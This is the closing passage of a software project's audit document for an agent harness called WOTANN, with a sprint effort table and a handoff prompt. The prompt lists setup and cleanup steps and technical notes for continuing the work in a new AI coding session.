| Sprint 2a | 13 | ~20h | ☐ Not started |
| Sprint 2b | 10 | ~20h | ☐ Not started |
| Sprint 2c | 13 | ~20h | ☐ Not started |
| Sprint 2d | 26 | ~20h | ☐ Not started |
| Sprint 3 | 7 | ~37h | ☐ Not started |
| Sprint 4 | 25 | ~52h | ☐ Not started |
| **v0.2.0 TOTAL** | **135** | **~237h** | |
| Sprint 5 (backlog) | 20 | ~21h | ☐ Deferred |
| **GRAND TOTAL** | **155** | **~258h** | |

---

## SUPERCHARGED PROMPT FOR NEW SESSION

```
Read /Users/gabrielvuksani/Desktop/agent-harness/wotann/docs/MASTER_AUDIT_2026-04-14.md

Skip to §78 "UNIFIED SPRINT PLAN" — this is the ONLY section you need to execute. It has all 155 items in dependency order with checkboxes. Execute top to bottom, Sprint 0 first.

CRITICAL FIRST COMMANDS:
1. npm ci (S0-13 — TUI crashes without this)
2. git rm CREDENTIALS_NEEDED.md (S0-1 — Supabase creds on PUBLIC GitHub)

KEY CONTEXT:
- Daemon IPC = NDJSON over UDS (~/.wotann/kairos.sock), NOT HTTP. See §72.2.
- Tool calling broken on BOTH request AND response sides. S1-1 through S1-6 fix requests. S1-21 through S1-27 fix response parsing. BOTH needed.
- send_message Tauri command (commands.rs:342) is deprecated stub — fix in S1-7 unlocks ~1,700 LOC frontend.
- 8 hardcoded "anthropic" defaults in runtime.ts — fix in S1-16.
- Ollama is the ONLY adapter that correctly handles all 5 StreamChunk types — bring others to parity.

Git branch before each sprint. Commit after each group. Full regression (npm run typecheck && npm test) after Sprint 0+1.

For implementation details on any item, search the document for the item ID.
Project CLAUDE.md: /Users/gabrielvuksani/Desktop/agent-harness/wotann/CLAUDE.md
```

---

*COMPLETE. 11 audit rounds, 32 Opus-class agents, 78 sections, ~3,900 lines. §78 is the unified execution checklist — 155 items in one place, dependency-ordered, with checkboxes. This document is the single source of truth for WOTANN's state and implementation plan.*
